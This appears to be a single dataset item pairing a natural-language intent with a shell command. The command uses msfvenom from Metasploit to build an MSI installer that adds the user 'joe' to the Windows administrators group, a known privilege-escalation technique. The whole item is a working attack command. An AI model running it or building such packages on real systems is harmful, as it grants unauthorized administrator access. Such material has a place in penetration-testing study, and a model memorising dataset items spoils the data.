# Natural language intent:
# An MSI installer package can be easily generated using msfvenom utility from Metasploit Framework. For instance, we can add ourselves into the administrators group:

msfvenom -p windows/exec CMD='net localgroup administrators joe /add' -f msi > pkg.msi
